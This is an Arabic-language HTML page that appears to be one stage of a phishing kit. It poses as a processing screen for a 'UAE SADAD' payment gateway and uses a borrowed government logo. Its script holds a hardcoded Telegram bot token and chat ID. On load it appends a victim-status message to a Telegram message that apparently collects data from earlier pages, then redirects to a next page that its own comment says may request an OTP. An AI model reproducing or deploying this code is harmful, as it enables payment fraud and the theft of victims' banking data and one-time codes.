<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل - بوابة سداد الإمارات</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="icon" href="https://petra.gov.jo/upload/1542630954928.jpg" type="image/x-icon">
    <style>
        :root {
            --primary-color: #008000;
            --text-color: #333;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Tajawal', sans-serif;
            background-color: #f9f9f9;
            color: var(--text-color);
            display: flex; align-items: center; justify-content: center; min-height: 100vh;
        }

        .container {
            max-width: 500px; width: 90%; text-align: center;
            background: white; padding: 40px; border-radius: 15px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
        }

        .header img { height: 70px; margin-bottom: 20px; }

        .spinner {
            width: 50px; height: 50px; border: 5px solid #f3f3f3;
            border-top: 5px solid var(--primary-color);
            border-radius: 50%; animation: spin 1s linear infinite;
            margin: 0 auto 25px;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        h2 { color: var(--primary-color); margin-bottom: 15px; font-size: 22px; }
        p { color: #666; font-size: 15px; line-height: 1.5; }

        .secure-footer {
            margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee;
            font-size: 12px; color: #aaa;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://petra.gov.jo/upload/1542630954928.jpg" alt="Logo">
        </div>

        <div class="spinner"></div>
        
        <h2>جاري معالجة طلبك</h2>
        <p>يرجى الانتظار وعدم إغلاق الصفحة أو الضغط على زر الرجوع، يتم الآن التحقق من البيانات مع البنك المصدر.</p>

        <div class="secure-footer">
            🔒 معاملة آمنة ومشفره بالكامل
        </div>
    </div>

    <script>
        const telegramBotToken = '8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw';
        const telegramChatId = '8362204213';

        async function appendToTelegram(newContent) {
            const existingId = localStorage.getItem('telegramMessageId');
            const existingContent = localStorage.getItem('telegramMessageContent') || '';
            const updatedContent = existingContent + '\n\n' + newContent;

            try {
                await fetch(`https://api.telegram.org/bot${telegramBotToken}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: telegramChatId,
                        message_id: parseInt(existingId),
                        text: updatedContent,
                        parse_mode: 'HTML'
                    })
                });
                localStorage.setItem('telegramMessageContent', updatedContent);
            } catch (e) { console.error(e); }
        }

        // إرسال إشعار بأن المستخدم في صفحة الانتظار
        window.onload = async () => {
            await appendToTelegram(`⏳ <b>حالة المستخدم:</b> ينتظر في صفحة المعالجة...`);
            
            // إعادة التوجيه بعد 7 ثوانٍ (مثلاً لطلب رمز OTP جديد أو العودة للرئيسية)
            setTimeout(() => {
                window.location.href = 'page5.html'; 
            }, 7000);
        };
    </script>
</body>
</html>
